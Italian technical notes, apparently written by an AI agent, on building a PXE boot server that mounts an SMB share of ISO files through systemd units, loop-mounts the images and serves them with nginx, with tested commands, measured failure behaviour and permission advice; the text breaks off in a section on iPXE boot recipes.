Type=cifs
Options=credentials=/etc/pixio/smb.cred,ro,vers=3.1.1,iocharset=utf8,uid=0,gid=www-data,file_mode=0640,dir_mode=0750,soft,echo_interval=15,actimeo=30,acdirmax=5,cache=strict,rsize=4194304,nounix,noserverino,_netdev
TimeoutSec=60
LazyUnmount=true
ForceUnmount=true
DirectoryMode=0755

[Install]
WantedBy=remote-fs.target

# /etc/systemd/system/srv-pixio-iso.automount
[Unit]
Description=Pixio: automount share SMB delle ISO
After=network-online.target
Wants=network-online.target

[Automount]
Where=/srv/pixio/iso
TimeoutIdleSec=0
DirectoryMode=0755

[Install]
WantedBy=remote-fs.target

# Attivazione (la GUI abilita SOLO l'automount; il .mount viene tirato su on-demand):
#   systemctl daemon-reload && systemctl enable --now srv-pixio-iso.automount
# Rimontare dopo cambio config: systemctl daemon-reload; systemctl restart srv-pixio-iso.mount
# Smontare anche se la rete è caduta: systemctl stop srv-pixio-iso.mount  (LazyUnmount/ForceUnmount = umount -l -f)
#
# NOTE (verificate con systemd-analyze verify = ok):
# - What= accetta spazi nel path; usare sempre '/' (mount.cifs: "It's generally preferred to use forward slashes"); convertire l'UNC \\srv\share -> //srv/share nella GUI.
# - x-systemd.automount / x-systemd.idle-timeout / x-systemd.mount-timeout / x-systemd.device-timeout sono opzioni per /etc/fstab: man systemd.mount dice per mount-timeout/device-timeout "can only be used in /etc/fstab, and will be ignored when part of the Options= setting in a unit file". Nelle unit native si usano TimeoutSec= (mount) e TimeoutIdleSec= (automount). In Options= di una unit sono comunque innocue: verificato che mount passa a mount.cifs solo le opzioni fs (--verbose: ip=,unc=,port=,vers=,user=,domain=,pass=) e scarta _netdev,nofail,x-*.
# - nofail in Options= di una unit nativa non serve: la unit è WantedBy=remote-fs.target e l'automount non blocca il boot. TimeoutIdleSec=0 = mai smontare per inattività (i loop mount tengono comunque il file aperto: un idle-unmount fallirebbe/rimarrebbe busy).
# - Con uid=/gid= il kernel abilita forceuid/forcegid (dmesg: "enabling forceuid mount option implicitly because uid= option is specified").
# - soft è già il default; hard = i processi si bloccano finché il server non torna (man mount.cifs). echo_interval: "The reconnection happens at twice the value of the echo_interval" (default 60 -> 120 s; 15 -> 30 s).
# - rsize: "Default requested during mount is 4MB ... Maximum size that servers will accept is typically 8MB for SMB3" -> 4194304 è già il default, 8388608 solo se il server lo accetta.
# - vers=3.1.1: se il server è vecchio (2012/8.1) usare vers=3.0 o omettere (default = negozia il più alto >= 2.1). Verifica dialetto: grep Dialect /proc/fs/cifs/DebugData (qui 0x311).
# - noserverino: evita inode > 2^32 dal server (man: INODE NUMBERS); nounix: disabilita le Unix Extensions (Windows non le ha; con Samba evitano che uid/gid/mode arrivino dal server).
```

### 1c. Alternativa /etc/fstab (una sola riga) — solo se NON si usano le unit native

*Fonte:* man systemd.mount(5) systemd 257 (grep locale) — *confidenza:* alta

```
//fileserver/ISO\040Library/PXE  /srv/pixio/iso  cifs  credentials=/etc/pixio/smb.cred,ro,vers=3.1.1,iocharset=utf8,uid=0,gid=www-data,file_mode=0640,dir_mode=0750,soft,echo_interval=15,actimeo=30,acdirmax=5,cache=strict,nounix,noserverino,_netdev,nofail,x-systemd.automount,x-systemd.idle-timeout=0,x-systemd.mount-timeout=60,x-systemd.requires=network-online.target  0  0

# man systemd.mount: "_netdev ... Network mount units are ordered between remote-fs-pre.target and remote-fs.target ... They also pull in network-online.target and are ordered after it";
# "nofail: this mount will be only wanted, not required ... the boot will continue without waiting for the mount unit";
# "x-systemd.automount: An automount unit will be created"; "x-systemd.idle-timeout= Configures the idle timeout of the automount unit";
# "x-systemd.requires= Configures a Requires= and an After= dependency ... always applies to the created mount unit only regardless whether x-systemd.automount has been specified".
# Spazi nel path in fstab: \040. La spec ARCHITECTURE.md prevede unit generate dalla GUI -> preferire le unit native (man systemd.mount: "For tooling, writing mount units should be preferred over editing /etc/fstab").
```

### 1d. systemd-escape per nomi unit (mountpoint con spazi/parentesi/trattini)

*Fonte:* systemd-escape(1) eseguito su questa macchina; man systemd.unit(5) — *confidenza:* alta

```
$ systemd-escape -p --suffix=mount '/srv/pixio/iso'
srv-pixio-iso.mount
$ systemd-escape -p --suffix=mount '/srv/pixio/iso/ISO Library (2024)'
srv-pixio-iso-ISO\x20Library\x20\x282024\x29.mount
$ systemd-escape -p --suffix=mount '/srv/pixio/iso-share_1'
srv-pixio-iso\x2dshare_1.mount
$ systemd-escape -p --suffix=mount '/srv/pixio/iso/àé'
srv-pixio-iso-\xc3\xa0\xc3\xa9.mount
$ systemd-escape -u -p 'srv-pixio-iso-ISO\x20Library\x20\x282024\x29'
/srv/pixio/iso/ISO Library (2024)

# In Python senza subprocess (stesso algoritmo di systemd.unit(5) "String Escaping for Inclusion in Unit Names"):
def systemd_escape_path(path: str) -> str:
    p = '/'.join(s for s in path.split('/') if s and s != '.')
    out = []
    for i, ch in enumerate(p.encode()):
        c = chr(ch)
        if c == '/': out.append('-')
        elif c.isascii() and (c.isalnum() or c in ':_') or (c == '.' and i > 0): out.append(c)
        else: out.append('\\x%02x' % ch)
    return ''.join(out) or '-'
# Regola pratica: il mountpoint della share va tenuto FISSO (/srv/pixio/iso, o /srv/pixio/iso/<slug> per più share, con slug [a-z0-9]) così il nome unit resta banale; gli spazi finiscono solo in What=, dove non servono escape.
```

### 2. "Verifica connessione" senza montare: smbclient con file credenziali (stesso /etc/pixio/smb.cred)

*Fonte:* man smbclient(1) 4.22 (-A: "username = <value> / password = <value> / domain = <value>"; -c: "-N is implied by -c"; recurse) + test empirico — *confidenza:* alta

```
# Elenco share del server (NB: -L IGNORA -p/--port, usa sempre 445: verificato; ok per Windows):
smbclient -L //fileserver -A /etc/pixio/smb.cred -m SMB3 -t 10 -g
#   output -g (grepable):  Disk|ISO Library|commento   /  IPC|IPC$|IPC Service
#   riga finale "SMB1 disabled -- no workgroup available" è normale (non è un errore)

# Test share + listing (rc=0 ok, rc=1 errore; -c implica -N; tutto in una connessione):
smbclient '//fileserver/ISO Library' -A /etc/pixio/smb.cred -t 10 -c 'ls'
# sottocartella iniziale (spazi ok): -D 'sub dir'
smbclient '//fileserver/ISO Library' -A /etc/pixio/smb.cred -D 'Windows/2024' -c 'ls'

# Scan ricorsivo di TUTTE le ISO (recurse ON + ls senza maschera; 'ls *.iso' con recurse NON scende nelle sottocartelle: verificato):
smbclient '//fileserver/ISO Library' -A /etc/pixio/smb.cred -t 10 -c 'recurse ON; ls'
# formato output (verificato):
#   test.iso                            N 42319872  Tue Sep  8 18:50:24 2026
#   sub dir                             D        0  Tue Sep  8 18:50:24 2026
#   \sub dir                                    <- header della sottocartella, poi le sue entry
#   Test ISO (x).iso                    N 42319872  Tue Sep  8 18:50:24 2026
# Parsing: righe con attributi (A|N|D|H|R|S)+ e size; ignorare '.' '..' e la riga finale 'NNN blocks of size ...'; la riga che inizia con '\' è la directory corrente; filtrare name.lower().endswith('.iso') lato client.
# Dettaglio singolo file: -c 'allinfo "sub dir\\Test ISO (x).iso"' -> create_time/write_time/size (stream ::$DATA)

# Errori tipici (stderr, rc=1) da mappare in GUI:
#   session setup failed: NT_STATUS_LOGON_FAILURE        -> utente/password/dominio errati
#   tree connect failed: NT_STATUS_BAD_NETWORK_NAME       -> share inesistente
#   NT_STATUS_ACCESS_DENIED listing \*                    -> autenticato ma senza permesso di lettura sulla cartella
#   do_connect: Connection to X failed (Error NT_STATUS_IO_TIMEOUT) -> host non raggiungibile (-t N limita l'attesa; usare anche timeout(1) esterno)
#   NT_STATUS_HOST_UNREACHABLE / NT_STATUS_CONNECTION_REFUSED  -> rete/porta 445 chiusa
# Python: subprocess.run(['smbclient', f'//{host}/{share}', '-A', cred, '-t', '10', '-c', 'recurse ON; ls'], capture_output=True, text=True, timeout=60)
```

### 3a. Loop-mount di un .iso che sta su CIFS: funziona (verificato kernel 6.12)

*Fonte:* test empirico su questa macchina (mount, losetup -l, md5sum); man losetup(8) — *confidenza:* alta

```
mount -t iso9660 -o loop,ro,nojoliet "/srv/pixio/iso/sub dir/Test ISO (x).iso" /srv/pixio/http/iso/<slug>
# oppure lasciar rilevare il tipo (iso9660/udf; le ISO Windows sono UDF+iso9660 bridge): mount -o loop,ro FILE DIR

# Risultati:
# - cache=strict (default): mount ok, losetup -l -> RO=1 DIO=0, LOG-SEC=512; dd 40 MB via loop md5 identico all'originale.
# - cache=none: mount -o loop ok, DIO=0, md5 ok. losetup --direct-io=on accettato (DIO=1) sia con cache=strict sia cache=none -> non serve: usare il default (page cache del CIFS = letture ripetute veloci). Il vecchio limite 'loop richiede sendfile del fs' (LKML 2003) NON vale più.
# - Il fs iso9660 del loop ha permessi propri (RockRidge 0644/0755 o default): www-data e nobody leggono; i mode/uid del mount CIFS NON contano per il contenuto del loop, contano solo per aprire il file .iso (lo apre root in fase di mount).
# - /proc/mounts del loop: /dev/loopN /srv/pixio/http/iso/<slug> iso9660 ro,relatime,nojoliet,check=s,map=n,blocksize=2048,iocharset=utf8
# - Prestazioni (loopback): 40 MB in ~0.1 s in tutte le varianti; sulla LAN il collo è la rete (SMB 3.1.1, rsize 4 MiB, credits 8125).
# - Attenzione a mount doppi: sul sistema ora ci sono loop2 e loop3 sullo STESSO file (Win11 LTSC) -> prima di montare controllare 'findmnt -T DIR' / 'losetup -j FILE' (o usare losetup -L/--nooverlap).
```

### 3b. Cosa succede se la rete cade (misurato) e come reagire

*Fonte:* test empirico (SIGSTOP/SIGKILL dello smbd di prova, dmesg, timeout) su questa macchina — *confidenza:* alta

```
# Scenario 1: server chiude/RST (smbd killato, equivalente a server spento o riavviato):
#   lettura file su CIFS  -> errore dopo ~10 s: errno 112 'Host is down' (EHOSTDOWN)   [soft, echo_interval=15]
#   lettura via loop      -> dopo ~21 s dmesg 'I/O error, dev loop5, sector 76 op READ' e open() fallisce con ENOENT (iso9660 cachea la lookup fallita)
#   quando il server torna: il mount CIFS SI RICONNETTE DA SOLO (lettura ok senza remount, md5 ok);
#   il LOOP RESTA ROTTO (ENOENT persistente sui file toccati durante il blackout) -> va rimontato:
#       umount -l /srv/pixio/http/iso/<slug>; mount -o loop,ro FILE DIR      (verificato: md5 ok dopo remount)
# Scenario 2: server 'muto' (TCP vivo ma non risponde, simulato con SIGSTOP a smbd):
#   dd via loop bloccato in stato D: 'timeout 200' non l'ha ucciso fino a 285 s; 'ls' sul mount >100 s; stat >137 s -> soft NON aiuta: l'attesa è nel reconnect (2*echo_interval) più i retry.
#   dmesg: 'nonblocking retry error, dev loop5, sector 76'.
#   umount -l (lazy) sia del loop sia del CIFS ritorna in 0 s anche col server muto (verificato); mount -t cifs verso server muto fallisce dopo 43 s (rc 32, 'mount error(112): Host is down'); verso IP irraggiungibile dopo 10 s ('mount error(115): could not connect').
# Regole per la GUI/servizio:
#   1) mai fare stat/scandir sulla share nel thread delle richieste HTTP: usare un worker con timeout (thread + queue; os.stat in D non è interrompibile) e mostrare 'share non raggiungibile' se non risponde entro N s.
#   2) health-check leggero: prima 'smbclient -c ls' (ha timeout proprio, non blocca il kernel), poi stat del mountpoint.
#   3) su errore EIO/ENOENT dal loop dopo un blackout: umount -l + mount del loop (idempotente); su EHOSTDOWN dal CIFS: attendere, non rimontare (si riconnette da solo). Se il mount è definitivamente compromesso: systemctl stop srv-pixio-iso.mount (LazyUnmount+ForceUnmount) e systemctl start.
#   4) errno da mappare in Python: 112 EHOSTDOWN 'Host is down', 5 EIO, 2 ENOENT, 115 EHOSTUNREACH/ECONNREFUSED sul mount.
```

### 3c. Copia locale (cache) con progresso parsabile: rsync --info=progress2

*Fonte:* man rsync (3.x) + output reale su questa macchina — *confidenza:* alta

```
# comando (stdout line-buffered, senza -v per non stampare i nomi):
rsync -a --inplace --info=progress2 --no-inc-recursive --outbuf=L "/srv/pixio/iso/sub dir/Test ISO (x).iso" /srv/pixio/cache/<slug>.iso.part && mv /srv/pixio/cache/<slug>.iso.part /srv/pixio/cache/<slug>.iso
# output reale (righe separate da '\r', l'ultima da '\n'):
#          32.768   0%    0,00kB/s    0:00:00  
#      42.319.872 100%  775,54MB/s    0:00:00 (xfr#1, to-chk=0/1)
# man rsync: "--info=progress2 option that outputs statistics based on the whole transfer"; "--outbuf=MODE ... change Full buffering to Line buffering when rsync's output is going to a file or pipe".
# Parsing Python (locale-indipendente: i separatori delle migliaia dipendono dal locale -> lanciare con env LC_ALL=C):
import re, subprocess
RX = re.compile(r'^\s*([\d,\.]+)\s+(\d+)%\s+(\S+)\s+(\d+:\d+:\d+)')
p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, env={'LC_ALL':'C'}, text=True, bufsize=1)
buf=''
for ch in iter(lambda: p.stdout.read(1), ''):
    if ch in '\r\n':
        m = RX.match(buf); buf=''
        if m: bytes_done=int(m.group(1).replace(',','')); pct=int(m.group(2)); speed=m.group(3); eta=m.group(4)  # -> SSE alla GUI
    else: buf+=ch
# Alternativa senza rsync: copia a blocchi in Python (shutil.copyfileobj con callback, 4 MiB) e os.fstat().st_size / size totale; cp non ha progress parsabile.
```

### 4. nginx: /etc/nginx/sites-available/pixio (completa)

*Fonte:* https://nginx.org/en/docs/http/ngx_http_core_module.html ; https://nginx.org/en/docs/http/ngx_http_proxy_module.html ; https://nginx.org/en/docs/http/ngx_http_autoindex_module.html ; test con nginx 1.26.3 temporaneo su :8099 (sendfile/aio/directio/Range/SSE) su questa macchina; https://raw.githubusercontent.com/ipxe/ipxe/master/src/net/tcp/httpblock.c (HTTP_BLKSIZE 512, range.start = lba*512, HEAD per la capacità) — *confidenza:* alta

```
# /etc/nginx/sites-available/pixio  — Pixio PXE: file statici /pxe/ + reverse proxy GUI (gunicorn 127.0.0.1:8080)
server {
    listen 80 default_server;
    listen [::]:80 default_server;
    server_name _;
    server_tokens off;
    access_log /var/log/nginx/pixio.access.log;
    error_log  /var/log/nginx/pixio.error.log;

    # --- file di boot: ISO montate in loop, symlink ai file .iso (su CIFS), wimboot/memdisk/kernel ---
    location /pxe/ {
        alias /srv/pixio/http/;
        autoindex on;
        autoindex_exact_size on;
        autoindex_localtime on;
        # tutto come binario (iPXE/wimboot/casper non guardano il MIME, ma evitiamo text/plain e gzip)
        types { }
        default_type application/octet-stream;
        gzip off;
        # file grandi (fino a decine di GB) da CIFS e da loop iso9660/udf:
        sendfile on;              # verificato: sendfile() funziona su cifs.ko 2.51 e su iso9660 loop (md5 ok, 4 download paralleli ok)
        sendfile_max_chunk 1m;    # default 2m dalla 1.21.4; evita che una connessione monopolizzi il worker
        tcp_nopush on;
        aio threads;              # lettura da fs di rete/loop senza bloccare il worker (nginx Debian è --with-threads)
        # directio: NON usarlo qui -> su iso9660 loop produce [alert] fcntl(O_DIRECT) failed (22: Invalid argument) a ogni richiesta (verificato)
        output_buffers 2 512k;
        send_timeout 600s;        # timeout tra due write successive (non sull'intera risposta)
        keepalive_timeout 300s;
        # Range: abilitato di default in nginx (Accept-Ranges: bytes automatico; NON aggiungere add_header Accept-Ranges -> header duplicato, verificato)
        max_ranges 1;             # iPXE sanboot http (httpblock.c) chiede un range di 512 B per volta: un solo range basta e limita gli abusi multi-range
        open_file_cache off;      # niente cache di fd/stat: i loop mount cambiano e la share è remota
        disable_symlinks off;     # /srv/pixio/http/isofile/<slug>.iso è un symlink verso /srv/pixio/iso (CIFS)
        etag on;
    }

    # --- menu iPXE e API/SPA della GUI ---
    location / {
        proxy_pass http://127.0.0.1:8080;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header Connection "";
        proxy_redirect off;
        proxy_cache off;
        # log live via SSE: nessun buffering, timeout lunghi (verificato: eventi consegnati 1/s in tempo reale)
        proxy_buffering off;
        proxy_read_timeout 1h;
        proxy_send_timeout 1h;
        proxy_connect_timeout 10s;
        # upload ISO grandi a chunk dalla web UI:
        client_max_body_size 0;
        proxy_request_buffering off;
        gzip off;
    }
}

# Note dalla doc ufficiale nginx (ngx_http_core_module / ngx_http_proxy_module):
# - "sendfile on: Enables or disables the use of sendfile()"; "aio threads: files can be read and sent using multi-threading (1.7.11), without blocking a worker process ... Multi-threaded sending of files is only supported on Linux"; "When both AIO and sendfile are enabled on Linux, AIO is used for files that are larger than or equal to the size specified in the directio directive, while sendfile is used for files of smaller sizes or when directio is disabled." -> con directio off + aio threads, nginx usa sendfile nel thread pool.
# - "directio ... The directive automatically disables the use of sendfile for a given request" (per questo non lo vogliamo: e su iso9660 O_DIRECT fallisce).
# - "tcp_nopush ... The options are enabled only when sendfile is used."
# - "max_ranges number: Limits the maximum allowed number of ranges in byte-range requests ... By default, the number of ranges is not limited. The zero value disables the byte-range support completely."
# - "send_timeout: The timeout is set only between two successive write operations, not for the transmission of the whole response."
# - types { } + default_type application/octet-stream: "To make a particular location emit the application/octet-stream MIME type for all requests".
# - proxy_buffering: "When buffering is disabled, the response is passed to a client synchronously, immediately as it is received. ... Buffering can also be enabled or disabled by passing yes or no in the X-Accel-Buffering response header field." (Flask SSE: aggiungere header X-Accel-Buffering: no per sicurezza)
# - proxy_read_timeout: "The timeout is set only between two successive read operations" (SSE: mandare un commento ': ping' ogni 15-30 s dal backend).
# - open_file_cache: cachea "open file descriptors, their sizes and modification times ... file lookup errors" -> tenerlo off su contenuti che cambiano con i mount.
# Test: nginx -t && systemctl reload nginx
# Range test: curl -s -r 32768-33279 -o /dev/null -w '%{http_code} %{size_download}\n' http://IP/pxe/isofile/<slug>.iso  -> atteso '206 512'
```

### 5. Permessi: cosa vede www-data (verificato)

*Fonte:* test empirico (runuser -u www-data / -u nobody) + man mount.cifs (noperm) + /proc/mounts di questa macchina — *confidenza:* alta

```
# Mount CIFS con: uid=0,gid=www-data,file_mode=0640,dir_mode=0750 (SENZA noperm)
#   root:www-data 640 file, 750 dir  -> www-data legge (ls/head ok), nobody: 'Permesso negato'.  <- CONSIGLIATO
# Stesso mount CON noperm:
#   nobody legge il file 0640 -> noperm disattiva i controlli lato client (man: "Client does not do permission checks. This can expose files on this mount to access by other users on the local client system").
#   noperm serve solo con Unix Extensions e uid non allineati; con nounix + uid/gid forzati è inutile e pericoloso -> NON usarlo.
# Alternativa 'tutti leggono' (come il mount già presente su questa macchina //10.10.1.253/iso: uid=987,gid=987,file_mode=0444,dir_mode=0555,noperm): file_mode=0444,dir_mode=0555 senza noperm è equivalente e più pulito.
# Loop mount (iso9660/udf, ro): i permessi vengono dall'immagine (di norma 0444/0555 o 0644/0755) -> www-data legge; verificato anche nobody. Se un'ISO avesse permessi restrittivi (raro, RockRidge): mount -o loop,ro,mode=0444,dmode=0555 (iso9660) / -o loop,ro,mode=0444,dmode=0555 (udf) forza i mode.
# Symlink /srv/pixio/http/isofile/<slug>.iso -> /srv/pixio/iso/...: nginx segue il symlink (disable_symlinks off, default); serve che TUTTA la catena di directory sia traversabile da www-data: /srv/pixio (755), /srv/pixio/iso (mountpoint: dir_mode=0750 gid=www-data ok), sottocartelle (dir_mode). Test: sudo -u www-data head -c 1 /srv/pixio/http/isofile/<slug>.iso >/dev/null && echo OK ; namei -l /srv/pixio/http/isofile/<slug>.iso
# I loop mount vengono fatti da root (pixio.service o pixio-mounts.service); i mountpoint /srv/pixio/http/iso/<slug> creati 0555 root:root.
# smb.cred deve restare 0600 root:root: lo legge mount.cifs (root via systemd) e smbclient lanciato dalla GUI (se gunicorn gira come utente 'pixio' non root, servono sudoers per mount/smbclient oppure un helper root: smbclient -A richiede di leggere il file).
```

### 6. Rilevare nuove ISO senza inotify: polling os.scandir + actimeo/acdirmax

*Fonte:* https://lwn.net/Articles/896055/ ; https://wiki.samba.org/index.php/LinuxCIFSKernel ; man mount.cifs (actimeo/acdirmax) ; test python su questa macchina — *confidenza:* alta

```
# inotify/fanotify NON funzionano su CIFS: il kernel non inoltra le watch al filesystem di rete (LWN 'Change notifications for network filesystems', 2022: "inotify only works with local filesystems"); cifs.ko ha solo un ioctl CHANGE_NOTIFY ad hoc (kernel 6.1, LinuxCIFSKernel wiki) non esposto da inotify.
# Polling (verificato): scandir ricorsivo della share da 2 file in 1 ms; con actimeo=30 un file creato lato server è apparso dopo ~38 s (cache attributi directory + eventuale directory lease).
#  -> usare acdirmax=5 (max age cache attributi DIRECTORY, man mount.cifs) mantenendo actimeo=30 per i file: le liste si aggiornano entro ~5 s, senza round-trip continui sui file.
import os, time
ISO_EXT = ('.iso',)
def scan_isos(root, max_depth=6):
    found = {}
    stack = [(root, 0)]
    while stack:
        d, depth = stack.pop()
        try:
            with os.scandir(d) as it:
                for e in it:
                    try:
                        if e.is_dir(follow_symlinks=False):
                            if depth < max_depth and not e.name.startswith(('.', '$', '~')): stack.append((e.path, depth+1))
                        elif e.is_file(follow_symlinks=False) and e.name.lower().endswith(ISO_EXT):
                            st = e.stat(follow_symlinks=False)
                            found[os.path.relpath(e.path, root)] = (st.st_size, int(st.st_mtime))
                    except OSError:
                        pass          # file sparito/EHOSTDOWN: si riprova al prossimo giro
        except OSError:
            pass
    return found
# firma catalogo = dict(path -> (size, mtime)); confrontare con la scansione precedente: nuovi = keys nuovi, cambiati = size/mtime diversi, rimossi = keys mancanti.
# File in copia (Windows sta ancora scrivendo): size che cambia tra due scan consecutivi o mtime < 60 s -> stato 'in arrivo', non montare.
# Eseguire lo scan in un thread dedicato con intervallo 30-60 s e un timeout logico (se lo scan dura > 30 s => share lenta/irraggiungibile; il thread può restare in D: non riusare lo stesso thread, lanciarne uno nuovo e segnalare). Bottone 'Riscansiona' = scan immediato (i risultati riflettono la cache attributi, max acdirmax s di ritardo).
# NON mettere st_ino nella firma (noserverino => inode generati lato client, non stabili tra remount).
```

### 7. Comandi di test/diagnostica (GUI 'Verifica' e install.sh)

*Fonte:* test empirico su questa macchina + man pages — *confidenza:* alta

```
# 0) porta 445 raggiungibile (senza smbclient): timeout 5 bash -c '</dev/tcp/fileserver/445' && echo open
# 1) credenziali+share (no mount): smbclient '//fileserver/ISO Library' -A /etc/pixio/smb.cred -t 10 -c 'ls' ; echo rc=$?
# 2) mount manuale con log:  mount -t cifs '//fileserver/ISO Library/PXE' /srv/pixio/iso --verbose -o credentials=/etc/pixio/smb.cred,ro,vers=3.1.1,... ; dmesg | tail -n 5   (errori: 'cifs_mount failed w/return code = -13' password, '-2'/'BAD_NETWORK_NAME' share, '-115'/'-112' rete)
# 3) opzioni effettive + dialetto:  findmnt -T /srv/pixio/iso -o TARGET,SOURCE,FSTYPE,OPTIONS ; grep -E 'Dialect|rsize' /proc/fs/cifs/DebugData ; cat /proc/fs/cifs/Stats
# 4) unit: systemd-analyze verify /etc/systemd/system/srv-pixio-iso.mount /etc/systemd/system/srv-pixio-iso.automount ; systemctl status srv-pixio-iso.automount srv-pixio-iso.mount ; journalctl -u srv-pixio-iso.mount -b
# 5) loop:  mount -o loop,ro FILE.iso /srv/pixio/http/iso/slug ; losetup -l -O NAME,BACK-FILE,RO,DIO ; findmnt /srv/pixio/http/iso/slug
# 6) permessi www-data: sudo -u www-data ls /srv/pixio/http/iso/slug ; sudo -u www-data head -c1 /srv/pixio/http/isofile/slug.iso | wc -c
# 7) nginx: nginx -t ; curl -sI http://IP/pxe/isofile/slug.iso (200 + Accept-Ranges: bytes + Content-Length) ; curl -s -r 0-511 -o /dev/null -w '%{http_code} %{size_download}\n' http://IP/pxe/isofile/slug.iso (206 512) ; curl -s http://IP/pxe/isofile/slug.iso | md5sum vs md5sum /srv/pixio/iso/.../slug.iso ; grep -E 'alert|error' /var/log/nginx/pixio.error.log
# 8) SSE: curl -sN http://IP/api/logs/stream (eventi in tempo reale, non a blocchi)
# 9) smontare tutto in caso di rete persa: umount -l /srv/pixio/http/iso/* ; systemctl stop srv-pixio-iso.mount   (LazyUnmount=true/ForceUnmount=true = umount -l -f; ritorna subito anche con server muto: verificato)
```

### Trappole

- Credentials file: mount.cifs richiede 'username=value' SENZA spazi attorno a '=' (con spazi -> mount error(13) Permission denied, verificato). smbclient -A accetta entrambi. Generare sempre il formato senza spazi.
- 'noperm' fa leggere i file 0640 anche a utenti non nel gruppo (verificato con nobody): con nounix+uid/gid forzati non serve. Usare gid=www-data,file_mode=0640,dir_mode=0750 (o 0444/0555) senza noperm.
- Dopo una caduta del server SMB il mount CIFS si riconnette da solo, ma i LOOP MOUNT restano rotti (I/O error -> ENOENT persistente sul file toccato): la GUI/servizio deve fare umount -l + mount del loop quando il CIFS torna raggiungibile.
- Con server 'muto' (TCP vivo, nessuna risposta) stat/ls/read restano bloccati in stato D per minuti anche con soft ed echo_interval=15 (misurati 100-285 s); non eseguire mai stat/scandir della share nel thread HTTP della GUI; usare thread worker + timeout logico e smbclient (che ha -t) come health-check.
- x-systemd.mount-timeout / x-systemd.device-timeout sono ignorate in Options= delle unit native (man systemd.mount); usare TimeoutSec= nel .mount e TimeoutIdleSec= nell'.automount. In fstab invece vanno bene.
- nginx 'directio' su un loop mount iso9660 produce [alert] fcntl(O_DIRECT) failed (22: Invalid argument) a ogni richiesta (contenuto comunque servito): non usare directio; sendfile on + aio threads è ok e verificato su CIFS e loop.
- Non aggiungere 'add_header Accept-Ranges bytes': nginx lo manda già -> header duplicato (verificato).
- smbclient -L ignora -p/--port (si collega sempre a 445): irrilevante per Windows, ma non usarlo per server su porta non standard. 'recurse ON; ls *.iso' non scende nelle sottocartelle: usare 'recurse ON; ls' e filtrare lato client.
- actimeo=30 ritarda la visibilità di nuove ISO di ~30-40 s (misurato 38 s): aggiungere acdirmax=5 per le directory.
- TimeoutIdleSec=0 nell'automount: con i loop mount attivi un idle-unmount della share non può riuscire (file .iso aperti) e lascerebbe la unit in stato incoerente.
- Sul sistema esistono già loop2 e loop3 sullo stesso ISO (Win11 LTSC) e un mount CIFS //10.10.1.253/iso su /srv/pixio/sources/server-iso con opzioni uid=987,gid=987,file_mode=0444,dir_mode=0555,noperm,echo_interval=30,actimeo=30: il codice di mount dei loop deve controllare 'losetup -j FILE'/findmnt prima di montare per evitare duplicati.
- Durante i test ho creato e poi rimosso l'utente locale 'pixiotest' (necessario a smbpasswd dello smbd temporaneo) e temporaneamente reso traversabili (o+x) le directory /tmp/claude-0/... poi ripristinate; nessun altro file di sistema toccato; tutti i mount/loop/processi di prova rimossi (loop4/loop6 detach fatto).
- Path UNC: mount.cifs vuole //server/share/percorso con '/'; la GUI deve convertire \\server\share e non lasciare backslash dopo il nome share (man: 'it cannot do so in any path component following the sharename').
- Per iPXE sanboot http la risposta deve essere 206 con Content-Length esatto sul range (httpblock.c chiede blocchi da 512 B; HEAD per la capacità): verificato con curl -r 32768-33279 -> 206/512. casper url= scarica l'intera ISO in RAM (man casper: 'The ISO will be downloaded and mounted') -> non serve Range ma serve keepalive/timeout lunghi e niente gzip.

### Domande aperte

- Prestazioni reali sulla LAN (server Windows, 1 GbE): i test sono su loopback; utile misurare rsize=8388608 vs 4 MiB e multichannel (opzione 'multichannel', SMB3, se il server ha più NIC).
- Se gunicorn gira come utente non root ('pixio'), come vengono eseguiti mount/umount/losetup/smbclient con lettura di /etc/pixio/smb.cred 0600 (sudoers mirato o helper root/pixio-mounts.service)? Non verificato in questa sessione.
- Comportamento con server Windows reale sui directory lease (kernel 6.12 supporta max_cached_dirs; Windows concede directory leases): il ritardo di visibilità delle nuove ISO potrebbe essere inferiore ai 38 s misurati con Samba; da misurare sul campo.
- Il 403 di nginx osservato durante il test 'server muto' è dovuto al reset dei permessi della directory di scratch (artefatto dell'ambiente), non alla share: comportamento reale di nginx (aio threads) con share bloccata non misurato — ci si aspetta richieste appese fino a send_timeout/EHOSTDOWN.
- Per le ISO Windows (UDF) il loop mount con -t udf o autodetect: non testato qui (test fatto con iso9660 RockRidge/Joliet); sul sistema esistono già loop UDF montati (dmesg 'UDF-fs: warning ... No anchor found' su un ISO Win11 suggerisce fallback iso9660).

## Ricette di boot iPXE (kernel/initrd/cmdline) per ISO Linux servite via HTTP da ISO montata in loop — verificate su fonti ufficiali e sulle ISO reali

Ho verificato le ricette (a) sulle fonti ufficiali (sorgente casper di Ubuntu, pacchetto live-boot Debian, dracut livenet, archiso README/netboot ufficiale, manuale SystemRescue, docs Anaconda/RHEL, KIWI, SUSE, Alpine boot.ipxe + mkinitfs + modloop.initd, doc Broadcom ESXi, wiki Proxmox, syslinux/iPXE) e (b) scaricando le ISO reali (Debian netinst 13.6, Debian live 13.6, Ubuntu Server 24.04.4, Mint 22, Pop!_OS 24.04, Rescuezilla 2.6.2, Fedora WS 44, Tumbleweed Live, Leap 15.6 NET, Alma 9 boot, Arch 2026.09, EndeavourOS, SystemRescue 13.02, Clonezilla 3.3.3-15, GParted 1.8.1-3, Alpine 3.24.1, Proxmox 9.2-1, TrueNAS 25.10.7, Tails 7.12) e leggendone layout e isolinux/grub.cfg. Scoperte chiave: casper richiede che url=/iso-url= TERMINI in ".iso" (case 'url=*.iso' nel sorgente) e ip=dhcp; live-boot accetta fetch= sia del .squashfs sia dell'intera .iso; Fedora 42+/44 Live è costruita con kiwi (kernel in boot/x86_64/loader/, niente images/pxeboot) ma usa dracut root=live:http://.../LiveOS/squashfs.img; la boot ISO Alma NON ha .treeinfo (inst.stage2 usa il fallback images/install.img); Proxmox è fattibile passando la ISO come secondo initrd chiamato "proxmox.iso" (l'init dell'initrd la cerca esplicitamente: 'this is useful for PXE boot'); Arch 2026.09 non ha più ucode separati; SystemRescue ha nel proprio cfg PXE HTTP 'archisobasedir=sysresccd archiso_http_srv=http://${pxeserver}/'; Clonezilla/GParted 1.8.1 cmdline presi dal syslinux.cfg reale; Tails è rifiutato upstream e non parte; ESXi solo UEFI con mboot.efi + boot.cfg rigenerato (prefix=); memdisk solo BIOS, ISO < 2 GB, 